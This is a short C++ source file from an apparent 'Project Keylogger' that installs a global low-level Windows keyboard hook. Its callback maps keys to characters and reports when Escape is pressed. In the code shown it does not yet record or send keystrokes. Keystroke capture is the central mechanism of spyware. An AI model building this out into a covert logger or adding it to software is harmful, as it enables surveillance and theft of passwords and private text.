/**
 *							Project Keylogger
 */


#include					"keylogger_dll/KeyboardHook.h"

/**
 * KeyboardHook implementation
 */


KeyboardHook::KeyboardHook(const HookObserver& observer) : AHook::AHook(observer){
}

/**
 * @return bool true if hook set succeeded
 */
const bool						KeyboardHook::setHook() {
	if ((_hHook = SetWindowsHookEx(WH_KEYBOARD_LL, &keyboardhook, NULL, 0)) == NULL)
	{
		return false;
	}
	return true;
}

/**
 * @param int
 * @param LPARAM
 * @param WPARAM
 * @return LRESULT CALLBACK
 */
LRESULT CALLBACK			KeyboardHook::keyboardhook(int code, WPARAM wParam, LPARAM lParam) {
	std::cout << "hookfunction" << std::endl;
	PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)(lParam);
	char c = MapVirtualKey(p->vkCode, MAPVK_VK_TO_CHAR);
	if (c != NULL)
	{
		if (p->vkCode == VK_ESCAPE)
		{
			std::cout << "Escape detected" << std::endl;
		}
	}
    return CallNextHookEx(NULL, code, wParam, lParam);
}